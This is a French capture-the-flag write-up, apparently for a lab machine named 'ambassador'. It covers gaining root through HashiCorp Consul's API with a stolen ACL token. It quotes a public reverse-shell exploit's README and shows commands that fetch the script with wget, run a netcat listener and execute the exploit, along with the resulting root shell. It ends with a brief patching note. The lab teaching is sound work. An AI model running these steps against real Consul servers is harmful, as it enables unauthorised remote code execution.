Nous venons de trouver un token utiliser pour **"Consul"**.

Consul est un outil open source développé par HashiCorp pour la gestion des services et la découverte de services. Il s'agit d'un système de configuration distribué et d'un système de découverte de services qui permet aux applications de s'enregistrer dynamiquement et de découvrir les services disponibles dans un environnement de cloud computing.

* * *

### Recherche d'exploit :

Après quelques recherche sur internet, on peut trouver un exploit déjà écrit sur Github :

Lien : https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API

Voici le fichier README.md :

```txt
## This exploit helps you to get a reverse shell, exploiting the Hashicorp-Consul service via API, not using tools like metasploit

· When executing the script with python3 with the --help parameter, it asks us for a series of parameters
    
    --rhost RHOST  remote host  (ip of the victim machine, if not specified, 127.0.0.1 will be used)
    --rport RPORT  remote port  (port where the consul API is executed, if not specified, 8500 will be used)
    --lhost LHOST  local host   (ip where the shell will be received)
    --lport LPORT  local port   (port where the shell will be received)
    --token TOKEN  acl token    (acl token needed to authenticate with the api)

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit1.png">


· If we have what is necessary, we can give it the arguments and run it, example:

    python3 exploit.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.10 --lport 443 --token bb03b43b-1d81-d62b-24b5-39540ee469b5


· or can be compacted with the other argument options

    python3 exploit.py -rh 127.0.0.1 -rp 8500 -lh 10.10.14.10 -lp 443 -tk bb03b43b-1d81-d62b-24b5-39540ee469b5
    

· When executing the script with its arguments we should see a message with a + which indicates that the request has been sent correctly

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit2.png">


· Checking your listener, in a couple of seconds you should get a shell as the user running the service

<img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit3.png">


· In case it detects that it cannot connect to the host, it will give a message, check the port is exposed and use port forwarding if necessary, then try again


```

Exploitation :

- Lancement du server http avec le module **http.server** de **python** depuis notre machine:
    
    ```bash
    $ python3 -m http.server 9090
    ```
    
- Télèchargement du script exploit.py sur la machine cible avec **wget** :
    
    ```bash
    developer@ambassador:~$ wget http://10.10.14.27:9090/exploit.py
    --2023-03-09 12:23:05--  http://10.10.14.27:9090/exploit.py
    Connecting to 10.10.14.27:9090... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 1409 (1.4K) [text/x-python]
    Saving to: ‘exploit.py’
    
    exploit.py                                 100%[======================================================================================>]   1.38K  --.-KB/s    in 0s      
    
    2023-03-09 12:23:05 (8.47 MB/s) - ‘exploit.py’ saved [1409/1409]
    
    ```
    
- Lancement de **Netcat** sur notre machine :
    
    ```bash
    $ nc -lnvp 1337
    ```
    
- Exécution de l'exploit sur la machine cible :
    
    ```bash
    developer@ambassador:~$ python3 exploit.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.27 --lport 1337 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
    
    [+] Request sent successfully, check your listener
    ```
    
- L'exploitation a bien fonctionné, nous avons un shell :
    
    ```bash
    Ncat: Connection from 10.129.228.56.
    Ncat: Connection from 10.129.228.56:58714.
    bash: cannot set terminal process group (2695): Inappropriate ioctl for device
    bash: no job control in this shell
    root@ambassador:/# 
    ```
    
    ```bash
    root@ambassador:~# id
    id
    uid=0(root) gid=0(root) groups=0(root)
    ```
    

Nous voilà **administrateur** de la machine !

* * *

# FLAG

- user.txt
    
    ```bash
    $ cat user.txt 
    <USER_FLAG>
    ```
    
- root.txt
    
    ```bash
    cat /root/root.txt
    <ROOT_FLAG>
    ```
    

* * *

## FIX

Les failles "**Grafana 8.3.0 - Directory Traversal and Arbitrary File Read**" et "**Hashicorp-Consul-RCE-via-API**" ont été corrigées dans les versions ultérieures de **Grafana** et **Consul**. Une mise à jour devrait régler ce problème de sécurité.
